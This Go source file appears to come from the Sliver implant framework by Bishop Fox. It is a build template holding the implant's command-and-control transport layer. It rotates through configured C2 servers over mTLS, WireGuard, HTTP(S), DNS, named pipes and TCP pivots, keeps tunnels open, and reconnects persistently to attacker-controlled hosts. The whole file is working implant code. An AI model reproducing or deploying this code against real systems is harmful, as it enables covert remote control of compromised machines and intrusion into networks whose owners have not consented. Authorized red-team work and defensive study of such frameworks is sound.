package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (

	// {{if or .Config.HTTPc2Enabled .Config.TCPPivotc2Enabled .Config.WGc2Enabled}}
	"net"

	// {{end}}

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"crypto/x509"
	// {{if .Config.WGc2Enabled}}
	"errors"
	// {{end}}
	"io"
	"net/url"
	"os"
	"strconv"
	"sync"
	"time"

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"

	// {{if .Config.HTTPc2Enabled}}
	"github.com/golang/protobuf/proto"
	// {{end}}

	// {{if .Config.TCPPivotc2Enabled}}
	"strings"
	// {{end}}
)

var (
	mtlsPingInterval = 30 * time.Second

	keyPEM            = `{{.Config.Key}}`
	certPEM           = `{{.Config.Cert}}`
	caCertPEM         = `{{.Config.CACert}}`
	wgImplantPrivKey  = `{{.Config.WGImplantPrivKey}}`
	wgServerPubKey    = `{{.Config.WGServerPubKey}}`
	wgPeerTunIP       = `{{.Config.WGPeerTunIP}}`
	wgKeyExchangePort = getWgKeyExchangePort()
	wgTcpCommsPort    = getWgTcpCommsPort()

	readBufSize       = 16 * 1024 // 16kb
	maxErrors         = getMaxConnectionErrors()
	reconnectInterval = GetReconnectInterval()
	pollInterval      = GetPollInterval()

	ccCounter = new(int)

	activeC2         string
	activeConnection *Connection
	proxyURL         string
)

// Connection - Abstract connection to the server
type Connection struct {
	Send    chan *pb.Envelope
	Recv    chan *pb.Envelope
	IsOpen  bool
	ctrl    chan bool
	cleanup func()
	once    *sync.Once
	tunnels *map[uint64]*Tunnel
	mutex   *sync.RWMutex
}

// Cleanup - Execute cleanup once
func (c *Connection) Cleanup() {
	c.once.Do(func() {
		c.cleanup()
		c.IsOpen = false
	})
}

// Tunnel - Duplex byte read/write
type Tunnel struct {
	ID uint64

	Reader       io.ReadCloser
	ReadSequence uint64

	Writer        io.WriteCloser
	WriteSequence uint64
}

// Tunnel - Add tunnel to mapping
func (c *Connection) Tunnel(ID uint64) *Tunnel {
	c.mutex.RLock()
	defer c.mutex.RUnlock()
	return (*c.tunnels)[ID]
}

// AddTunnel - Add tunnel to mapping
func (c *Connection) AddTunnel(tun *Tunnel) {
	c.mutex.Lock()
	defer c.mutex.Unlock()

	(*c.tunnels)[tun.ID] = tun
}

// RemoveTunnel - Add tunnel to mapping
func (c *Connection) RemoveTunnel(ID uint64) {
	c.mutex.Lock()
	defer c.mutex.Unlock()
	delete(*c.tunnels, ID)
}

func (c *Connection) RequestResend(data []byte) {
	c.Send <- &sliverpb.Envelope{
		Type: sliverpb.MsgTunnelData,
		Data: data,
	}
}

// StartConnectionLoop - Starts the main connection loop
func StartConnectionLoop() *Connection {

	// {{if .Config.Debug}}
	log.Printf("Starting connection loop ...")
	// {{end}}

	connectionAttempts := 0
	for connectionAttempts < maxErrors {

		var connection *Connection
		var err error

		uri := nextCCServer()
		// {{if .Config.Debug}}
		log.Printf("Next CC = %s", uri.String())
		// {{end}}

		switch uri.Scheme {

		// *** MTLS ***
		// {{if .Config.MTLSc2Enabled}}
		case "mtls":
			connection, err = mtlsConnect(uri)
			if err == nil {
				activeC2 = uri.String()
				activeConnection = connection
				return connection
			}
			// {{if .Config.Debug}}
			log.Printf("[mtls] Connection failed %s", err)
			// {{end}}
			connectionAttempts++
			// {{end}}  - MTLSc2Enabled
		case "wg":
			// *** WG ***
			// {{if .Config.WGc2Enabled}}
			connection, err = wgConnect(uri)
			if err == nil {
				activeC2 = uri.String()
				activeConnection = connection
				return connection
			}
			// {{if .Config.Debug}}
			log.Printf("[wg] Connection failed %s", err)
			// {{end}}
			connectionAttempts++
			// {{end}}  - WGc2Enabled
		case "https":
			fallthrough
		case "http":
			// *** HTTP ***
			// {{if .Config.HTTPc2Enabled}}
			connection, err = httpConnect(uri)
			if err == nil {
				activeC2 = uri.String()
				activeConnection = connection
				return connection
			}
			// {{if .Config.Debug}}
			log.Printf("[%s] Connection failed %s", uri.Scheme, err)
			// {{end}}
			connectionAttempts++
			// {{end}} - HTTPc2Enabled

		case "dns":
			// *** DNS ***
			// {{if .Config.DNSc2Enabled}}
			connection, err = dnsConnect(uri)
			if err == nil {
				activeC2 = uri.String()
				activeConnection = connection
				return connection
			}
			// {{if .Config.Debug}}
			log.Printf("[dns] Connection failed %s", err)
			// {{end}}
			connectionAttempts++
			// {{end}} - DNSc2Enabled

		case "namedpipe":
			// *** Named Pipe ***
			// {{if .Config.NamePipec2Enabled}}
			connection, err = namedPipeConnect(uri)
			if err == nil {
				activeC2 = uri.String()
				activeConnection = connection
				return connection
			}
			// {{if .Config.Debug}}
			log.Printf("[namedpipe] Connection failed %s", err)
			// {{end}}
			connectionAttempts++
			// {{end}} -NamePipec2Enabled

		case "tcppivot":
			// {{if .Config.TCPPivotc2Enabled}}
			connection, err = tcpPivotConnect(uri)
			if err == nil {
				activeC2 = uri.String()
				activeConnection = connection
				return connection
			}
			// {{if .Config.Debug}}
			log.Printf("[tcppivot] Connection failed %s", err)
			// {{end}}
			connectionAttempts++
			// {{end}} -TCPPivotc2Enabled

		default:
			// {{if .Config.Debug}}
			log.Printf("Unknown c2 protocol %s", uri.Scheme)
			// {{end}}
		}

		// {{if .Config.Debug}}
		log.Printf("Sleep %d second(s) ...", reconnectInterval/time.Second)
		// {{end}}
		time.Sleep(reconnectInterval)
	}
	// {{if .Config.Debug}}
	log.Printf("[!] Max connection errors reached\n")
	// {{end}}

	return nil
}

var ccServers = []string{
	// {{range $index, $value := .Config.C2}}
	"{{$value}}", // {{$index}}
	// {{end}}
}

// GetActiveC2 returns the URL of the C2 in use
func GetActiveC2() string {
	return activeC2
}

// GetProxyURL return the URL of the current proxy in use
func GetProxyURL() string {
	if proxyURL == "" {
		return "none"
	}
	return proxyURL
}

// GetActiveConnection returns the Connection of the C2 in use
func GetActiveConnection() *Connection {
	return activeConnection
}

func nextCCServer() *url.URL {
	uri, err := url.Parse(ccServers[*ccCounter%len(ccServers)])
	*ccCounter++
	if err != nil {
		return nextCCServer()
	}
	return uri
}

// GetReconnectInterval - Parse the reconnect interval inserted at compile-time
func GetReconnectInterval() time.Duration {
	reconnect, err := strconv.Atoi(`{{.Config.ReconnectInterval}}`)
	if err != nil {
		return 60 * time.Second
	}
	return time.Duration(reconnect) * time.Second
}

func SetReconnectInterval(interval time.Duration) {
	reconnectInterval = interval
}

// GetPollInterval - Parse the poll interval inserted at compile-time
func GetPollInterval() time.Duration {
	pollInterval, err := strconv.Atoi(`{{.Config.PollInterval}}`)
	if err != nil {
		return 1 * time.Second
	}
	return time.Duration(pollInterval) * time.Second
}

func SetPollInterval(interval time.Duration) {
	pollInterval = interval
}

func getMaxConnectionErrors() int {
	maxConnectionErrors, err := strconv.Atoi(`{{.Config.MaxConnectionErrors}}`)
	if err != nil {
		return 1000
	}
	return maxConnectionErrors
}

func getWgKeyExchangePort() int {
	wgKeyExchangePort, err := strconv.Atoi(`{{.Config.WGKeyExchangePort}}`)
	if err != nil {
		return 1337
	}
	return wgKeyExchangePort
}

func getWgTcpCommsPort() int {
	wgTcpCommsPort, err := strconv.Atoi(`{{.Config.WGTcpCommsPort}}`)
	if err != nil {
		return 8888
	}
	return wgTcpCommsPort
}

// {{if .Config.MTLSc2Enabled}}
func mtlsConnect(uri *url.URL) (*Connection, error) {
	// {{if .Config.Debug}}
	log.Printf("Connecting -> %s", uri.Host)
	// {{end}}
	lport, err := strconv.Atoi(uri.Port())
	if err != nil {
		lport = 8888
	}
	conn, err := tlsConnect(uri.Hostname(), uint16(lport))
	if err != nil {
		return nil, err
	}

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[mtls] lost connection, cleanup...")
			// {{end}}
			close(send)
			conn.Close()
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for {
			select {
			case envelope, ok := <-send:
				if !ok {
					return
				}
				err := socketWriteEnvelope(conn, envelope)
				if err != nil {
					break
				}
			case <-time.After(mtlsPingInterval):
				socketWritePing(conn)
				if err != nil {
					break
				}
			}
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			envelope, err := socketReadEnvelope(conn)
			if err == io.EOF {
				break
			}
			if err != io.EOF && err != nil {
				break
			}
			if envelope != nil {
				recv <- envelope
			}
		}
	}()

	activeConnection = connection
	return connection, nil
}

// {{end}} -MTLSc2Enabled

// {{if .Config.WGc2Enabled}}
func wgConnect(uri *url.URL) (*Connection, error) {
	// {{if .Config.Debug}}
	log.Printf("Connecting -> %s", uri.Host)
	// {{end}}
	lport, err := strconv.Atoi(uri.Port())
	if err != nil {
		lport = 53
	}
	// Attempt to resolve the hostname in case
	// we received a domain name and not an IP address.
	// net.LookupHost() will still work with an IP address
	addrs, err := net.LookupHost(uri.Hostname())
	if err != nil {
		return nil, err
	}
	if len(addrs) == 0 {
		return nil, errors.New("{{if .Config.Debug}}Invalid address{{end}}")
	}
	hostname := addrs[0]
	conn, dev, err := wgSocketConnect(hostname, uint16(lport))
	if err != nil {
		return nil, err
	}

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[wg] lost connection, cleanup...")
			// {{end}}
			close(send)
			conn.Close()
			dev.Down()
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for {
			select {
			case envelope, ok := <-send:
				if !ok {
					return
				}
				err := socketWGWriteEnvelope(conn, envelope)
				if err != nil {
					break
				}
			case <-time.After(mtlsPingInterval):
				socketWGWritePing(conn)
				if err != nil {
					break
				}
			}
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			envelope, err := socketWGReadEnvelope(conn)
			if err == io.EOF {
				break
			}
			if err != io.EOF && err != nil {
				break
			}
			if envelope != nil {
				recv <- envelope
			}
		}
	}()

	activeConnection = connection
	return connection, nil
}

// {{end}} -WGc2Enabled

// {{if .Config.HTTPc2Enabled}}
func httpConnect(uri *url.URL) (*Connection, error) {

	// {{if .Config.Debug}}
	log.Printf("Connecting -> http(s)://%s", uri.Host)
	// {{end}}
	client, err := HTTPStartSession(uri.Host, uri.Path)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("http(s) connection error %v", err)
		// {{end}}
		return nil, err
	}
	proxyURL = client.ProxyURL

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool, 1)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[http] lost connection, cleanup...")
			// {{end}}
			close(send)
			ctrl <- true
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for envelope := range send {
			data, _ := proto.Marshal(envelope)
			// {{if .Config.Debug}}
			log.Printf("[http] send envelope ...")
			// {{end}}
			go client.Send(data)
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			select {
			case <-ctrl:
				return
			default:
				resp, err := client.Poll()
				switch err := err.(type) {
				case nil:
					envelope := &pb.Envelope{}
					proto.Unmarshal(resp, envelope)
					if err != nil {
						continue
					}
					recv <- envelope
				case net.Error:
					if err.Timeout() {
						// {{if .Config.Debug}}
						log.Printf("non-fatal error, continue")
						// {{end}}
						continue
					}
					return
				case *url.Error:
					if err, ok := err.Err.(net.Error); ok && err.Timeout() {
						// {{if .Config.Debug}}
						log.Printf("non-fatal error, continue")
						// {{end}}
						continue
					}
					return
				default:
					// {{if .Config.Debug}}
					log.Printf("[http] error: %#v", err)
					// {{end}}
					return
				}
			}
		}
	}()

	activeConnection = connection
	return connection, nil
}

// {{end}} -HTTPc2Enabled

// {{if .Config.DNSc2Enabled}}
func dnsConnect(uri *url.URL) (*Connection, error) {
	dnsParent := uri.Hostname()
	// {{if .Config.Debug}}
	log.Printf("Attempting to connect via DNS via parent: %s\n", dnsParent)
	// {{end}}
	sessionID, sessionKey, err := dnsStartSession(dnsParent)
	if err != nil {
		return nil, err
	}
	// {{if .Config.Debug}}
	log.Printf("Starting new session with id = %s\n", sessionID)
	// {{end}}

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool, 1)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[dns] lost connection, cleanup...")
			// {{end}}
			close(send)
			ctrl <- true // Stop polling
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for envelope := range send {
			dnsSessionSendEnvelope(dnsParent, sessionID, sessionKey, envelope)
		}
	}()

	go func() {
		defer connection.Cleanup()
		dnsSessionPoll(dnsParent, sessionID, sessionKey, ctrl, recv)
	}()

	activeConnection = connection
	return connection, nil
}

// {{end}} - .DNSc2Enabled

// {{if .Config.NamePipec2Enabled}}
func namedPipeConnect(uri *url.URL) (*Connection, error) {
	conn, err := namePipeDial(uri)
	if err != nil {
		return nil, err
	}
	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool, 1)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[namedpipe] lost connection, cleanup...")
			// {{end}}
			close(send)
			ctrl <- true
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for envelope := range send {
			// {{if .Config.Debug}}
			log.Printf("[namedpipe] send loop envelope type %d\n", envelope.Type)
			// {{end}}
			namedPipeWriteEnvelope(&conn, envelope)
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			envelope, err := namedPipeReadEnvelope(&conn)
			if err == io.EOF {
				break
			}
			if err == nil {
				recv <- envelope
				// {{if .Config.Debug}}
				log.Printf("[namedpipe] Receive loop envelope type %d\n", envelope.Type)
				// {{end}}
			}
		}
	}()
	activeConnection = connection
	return connection, nil
}

// {{end}} -NamePipec2Enabled

// {{if .Config.TCPPivotc2Enabled}}
func tcpPivotConnect(uri *url.URL) (*Connection, error) {
	addr := strings.ReplaceAll(uri.String(), "tcppivot://", "")
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		return nil, err
	}
	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool, 1)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[tcp-pivot] lost connection, cleanup...")
			// {{end}}
			close(send)
			ctrl <- true
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for envelope := range send {
			// {{if .Config.Debug}}
			log.Printf("[tcp-pivot] send loop envelope type %d\n", envelope.Type)
			// {{end}}
			tcpPivoteWriteEnvelope(&conn, envelope)
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			envelope, err := tcpPivotReadEnvelope(&conn)
			if err == io.EOF {
				break
			}
			if err == nil {
				recv <- envelope
				// {{if .Config.Debug}}
				log.Printf("[tcp-pivot] Receive loop envelope type %d\n", envelope.Type)
				// {{end}}
			}
		}
	}()
	activeConnection = connection
	return connection, nil
}

// {{end}} -TCPPivotc2Enabled

// rootOnlyVerifyCertificate - Go doesn't provide a method for only skipping hostname validation so
// we have to disable all of the fucking certificate validation and re-implement everything.
// https://github.com/golang/go/issues/21971
func rootOnlyVerifyCertificate(rawCerts [][]byte, _ [][]*x509.Certificate) error {

	roots := x509.NewCertPool()
	ok := roots.AppendCertsFromPEM([]byte(caCertPEM))
	if !ok {
		// {{if .Config.Debug}}
		log.Printf("Failed to parse root certificate")
		// {{end}}
		os.Exit(3)
	}

	cert, err := x509.ParseCertificate(rawCerts[0]) // We should only get one cert
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to parse certificate: " + err.Error())
		// {{end}}
		return err
	}

	// Basically we only care if the certificate was signed by our authority
	// Go selects sensible defaults for time and EKU, basically we're only
	// skipping the hostname check, I think?
	options := x509.VerifyOptions{
		Roots: roots,
	}
	if _, err := cert.Verify(options); err != nil {
		// {{if .Config.Debug}}
		log.Printf("Failed to verify certificate: " + err.Error())
		// {{end}}
		return err
	}

	return nil
}
